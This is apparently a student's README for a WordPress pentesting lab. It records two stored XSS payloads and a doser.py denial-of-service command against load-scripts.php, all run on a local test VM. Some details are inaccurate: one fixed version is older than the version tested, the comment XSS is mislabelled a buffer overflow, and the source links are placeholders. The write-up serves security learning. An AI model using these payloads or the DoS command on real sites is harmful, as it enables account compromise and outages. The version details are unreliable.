# Week7-CodePath

# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report


1. Authenticated Stored Cross-Site Scripting via Image Filename
  - [ ] Summary: By inserting javascript infront of filename of image when the file is uploaded and the image is selected the script will run. This is due to Word Press not filtering javascript in the filenames text when an image is uploaded.
    - Vulnerability types: Cross Site Scripting (XSS)
    - Tested in version: 4.2
    - Fixed in version: 4.0.13
  - [ ] GIF Walkthrough: https://gfycat.com/anothersorrowfulfritillarybutterfly
  - [ ] Steps to recreate: Include script <img src=a onclick=alert("Oh_Baby_a_Triple!")> infront of the .img
  - [ ] Affected source code: 
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
2. Authenticated Stored Cross-Site Scripting
  - [ ] Summary: By inserting malicious javascript (“<a title='x onclick=alert(unescape(/Pwned/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px "64kb characters"><a>") in the comment section followed by 64kb of characters, this creates a buffer overflow that allows the script to run when on the Post's page.
    - Vulnerability types: Cross Site Scripting (XSS)
    - Tested in version: 4.2
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: https://gfycat.com/CriminalWhichDoctorfish
  - [ ] Steps to recreate: Add the javascript in the comment section and after posting the comment click the page to activate XSS onclick.
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
3. Application Denial of Service (DoS) (Unpatched)
  - [ ] Summary: This DOS attack is accomplished by exploiting the vulnerability found in the page load-scripts.php which allows the user to send multiple javascript files in one request, this causes the network to slow to a crawl trying process all the scripts.
    - Vulnerability types: DOS attack
    - Tested in version: 4.2
    - Fixed in version: never fixed
  - [ ] GIF Walkthrough: https://gfycat.com/soulfulsophisticatedbarbet
  - [ ] Steps to recreate: By using the doser.py code created by Barak Tawily on github we can insert this command to DOS attack the Word Press server.
  ```
  python doser.py -g 'http://WPdistillery.vm/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999
  ```
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets
Reference:https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html

Reference:https://www.exploit-db.com/exploits/36844/

Reference:https://github.com/quitten/doser.py

Reference:https://thehackernews.com/2018/02/wordpress-dos-exploit.html

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [giphy](https://giphy.com/).

## Notes

During testing WPdistillery after performing a buffer overflow attack I ran into the issue of the Virtual Machine breaking. In which I had to reinstall the WPdistillery machine and had to set up everything again.

## License

    Copyright [2018] [Michael Freeman]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
